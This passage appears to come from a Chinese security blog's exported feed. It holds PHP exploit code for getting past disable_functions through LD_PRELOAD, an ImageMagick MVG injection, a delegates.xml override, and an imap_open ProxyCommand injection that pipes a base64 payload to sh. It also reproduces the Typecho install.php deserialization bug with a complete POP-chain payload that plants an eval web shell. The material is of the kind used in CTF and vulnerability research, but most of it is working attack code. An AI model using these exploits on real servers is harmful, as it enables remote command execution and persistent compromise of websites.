&gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); error_log(&quot;Oh no! We are out of FOOs!&quot;, 1, &quot;admin@example.com&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; 这里以error_log为例说明绕过了方法 ImageMagickexp:123456789101112131415161718192021&lt;?phpecho &quot;Disable Functions: &quot; . ini_get(&apos;disable_functions&apos;) . &quot;\n&quot;;$command = PHP_SAPI == &apos;cli&apos; ? $argv[1] : $_GET[&apos;cmd&apos;];if ($command == &apos;&apos;) &#123; $command = &apos;id&apos;;&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|$command&quot;)&apos;pop graphic-contextEOF;file_put_contents(&quot;KKKK.mvg&quot;, $exploit);$thumb = new Imagick();$thumb-&gt;readImage(&apos;KKKK.mvg&apos;);$thumb-&gt;writeImage(&apos;KKKK.png&apos;);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(&quot;KKKK.mvg&quot;);unlink(&quot;KKKK.png&quot;);?&gt; 当使用的imagemagick不存在漏洞时，如果putenv可用，还可以使用自定义delegates.xml的方式执行命令，利用方式如下：1234567891011121314151617181920&lt;?php$home = &apos;/tmp/xxx&apos;;ini_set(&apos;display_errors&apos;, 1); mkdir(&quot;$home/.magick/&quot;);file_put_contents(&quot;$home/.magick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;whoami &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);mkdir(&quot;$home/.config/&quot;);mkdir(&quot;$home/.config/ImageMagick&quot;);file_put_contents(&quot;$home/.config/ImageMagick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;whoami &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);touch(&quot;$home/test.foo&quot;);touch(&quot;$home/test.png&quot;);$_ENV[&apos;HOME&apos;] = $home;var_dump(putenv(&quot;HOME=$home/&quot;));var_dump(getenv(&quot;HOME&quot;));try &#123; $i = new Imagick(&quot;$home/test.foo&quot;); $i-&gt;writeImage(&quot;$home/test.png&quot;);&#125; catch(Exception $e) &#123; var_dump($e);&#125;var_dump(file_get_contents(&quot;$home/flag&quot;)); imap_open当安装了imap扩展时，可以考虑是使用imap_open执行命令,exp如下：123&lt;?php$server = &quot;x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh&#125;&quot;;imap_open(&apos;&#123;&apos;.$server.&apos;:143/imap&#125;INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error()); xdebugXdebug 是一个 PHP 的调试工具，支持在本地通过源码远程调试服务器上的 PHP 代码，当xdebug.remote_connect_back选项为1时，可以进行远程调试，从而执行任意php函数,详情利用方式可见rr师傅博客：https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface perl命令执行perl中的open函数可以执行命令，在ctf的linux命令执行中可能会遇到用法如下： 创建一个类似格式为’命令|’的文件，再使用 GET &#39;file:命令|&#39;即可执行该命令，需要注意的是GET命令不是linux自带命令，而是存在于libwww-perl中，apt可安装 之所以使用GET命令可以命令执行，是因为GET函数底层调用了open函数]]></content>
  </entry>
  <entry>
    <title><![CDATA[typecho反序列化漏洞复现]]></title>
    <url>%2F2017%2F10%2F29%2Ftypecho-deserialization.html</url>
    <content type="text"><![CDATA[0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!isset($_GET['finish']) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) &#123; exit;&#125;// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) &#123; if (empty($_SERVER['HTTP_REFERER'])) &#123; exit; &#125; $parts = parse_url($_SERVER['HTTP_REFERER']); if (!empty($parts['port'])) &#123; $parts['host'] = "&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"; &#125; if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) &#123; exit; &#125;&#125; 这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。 这里有一个反序列化操作，而参数从cookie获取，可控。 想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中： Typecho_FeedTypecho_ConfigTypecho_Db_Query 分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法 跟进该方法醒目的array_map函数和call_user_func函数。。。至此POP链已经构造完成。 0X03 Payload1234567891011121314151617181920&lt;?phpclass Typecho_Feed&#123; private $_type = 'RSS 2.0'; private $_items; public function __construct($a) &#123; $this-&gt;_items[] = array('author'=&gt;$a); &#125;&#125;class Typecho_Request&#123; private $_params = array('screenName'=&gt;'file_put_contents('shell.php', '&lt;?php @eval($_POST[tharavel]);?&gt;')'); private $_filter = array('assert');&#125;$payload1 = new Typecho_Request();$payload2 = new Typecho_Feed($payload1);$exp = array('adapter' =&gt; $payload2, 'prefix' =&gt; 'typecho');echo base64_encode(serialize($exp));]]></content>
  </entry>
</search>